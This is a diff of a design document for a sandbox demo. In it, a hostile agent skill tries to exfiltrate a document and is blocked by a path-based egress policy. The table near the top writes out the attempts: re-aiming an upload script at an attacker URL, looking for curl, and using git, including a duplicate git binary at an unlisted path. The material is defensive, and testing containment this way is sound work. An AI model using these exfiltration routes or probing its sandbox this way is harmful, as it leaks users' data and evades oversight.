@@ -215,7 +215,7 @@ what is legitimate and swap the parameters.
 | "The tool is legit — I'll re-aim it at my bucket and send the source document" | `node ~/bin/upload-results.mjs <raw doc> <attacker URL>` | `EACCES` at `connect()` |
 | "Maybe plain curl" | `command -v curl` | no curl in the image either |
 | "Fine — git, then. I'll push the document to a repo" | `/usr/bin/git ls-remote` to the attacker bucket *and* the results server | denied at `connect()` both ways — the results-server entry names one binary: node-26 |
-| "There's a second git in /usr/sbin — maybe it has different rights" | `/usr/sbin/git ls-remote` against GitHub itself | denied at `connect()` — same bytes, unlisted path, no rights |
+| "There's a second git in /usr/sbin — maybe it has different rights" | `/usr/sbin/git ls-remote` against GitHub itself | denied at `connect()` when the twin is real; otherwise the act retires with the facts on the record |
 
 The third row is the story's heart. The attacker did everything right by
 tool standards: the sanctioned binary, the sanctioned script, a file the
@@ -243,32 +243,27 @@ failure against a results server the sanctioned flow just showed
 answering, plus unchanged request counts — the threat model's
 controlled-destination rule.
 
-The twin-git row is the same lesson from the other direction, and it was
-found in the wild: the image ships two byte-identical, unlinked copies
-of git — `/usr/bin/git`, which the policy pairs with GitHub, and
-`/usr/sbin/git`, which no entry lists. The skill aims the twin at GitHub
-itself, the one destination its twin may reach, and is denied at
-`connect()`. The policy identifies binaries by path, not by content, so
-identical bytes at an unlisted path have no rights — and a fresh copy of
-git into a writable directory would behave the same way.
+The twin-git row is the same lesson from the other direction: the
+shell's `PATH` resolves git to `/usr/sbin/git` while the policy lists
+`/usr/bin/git`, and if those are two files, the skill aims the sbin one
+at GitHub itself, the one destination its policy-listed twin may reach.
+The policy identifies binaries by path, not by content, so identical
+bytes at an unlisted path have no rights — and a fresh copy of git
+into a writable directory would behave the same way.
 
-The duplicate's origin is traced, and it is subtler than an accidental
-extra copy. The Red Hat Hardened Images (project Hummingbird)
-core-runtime that the sandbox image builds on ships a standard merged
-`/usr` layout: `/usr/sbin` is a symlink to `bin`, so there is one git,
-one file, one identity — and the sbin-first `PATH` order the image uses
-is harmless. Somewhere in the sandbox image's own build that symlink was
-materialized into a real directory containing copies of the `/usr/bin`
-tools — `git` and `npm` alike — and the coherence broke: two files, two
-paths, two identities, with the shell's `PATH` resolving to the one no
-policy lists. Anything that shells out to `git` is therefore denied even
-to GitHub; nothing in the current opencode flows appears to do that (the
-review profile has no git entries at all), but it is a latent trap. The
-fix belongs in the sandbox image's build — preserve the symlink, or drop
-the duplicated copies — not in the policy: adding `/usr/sbin/git` would
-enshrine the mismatch. Until the image changes, the demo asserts both
-paths exist as byte-identical but distinct files, so this beat breaks
-loudly rather than silently.
+Whether that second git exists at all is a property of the image, and
+the demo measures it instead of assuming it. The base core-runtime
+(Hummingbird) ships a standard merged `/usr`: `/usr/sbin` is a symlink
+to `bin` — one git, one identity — and the sbin-first `PATH` order is
+harmless. An early inventory read two separate gits in the sandbox
+image, but `ls -l` on a file reached through a symlinked directory
+cannot distinguish a copy from the same file, so that reading was never
+proof. The demo therefore prints the filesystem facts — the `/usr/sbin`
+link state, both inodes, both checksums — and runs the beat only when
+there really are two files; in a merged-/usr image the act retires in
+the transcript with the facts on the record. A real duplicate would be
+a build bug to fix in the image — preserve the symlink — not in the
+policy: adding `/usr/sbin/git` would enshrine the mismatch.
 
 ### What the document demo shows
 
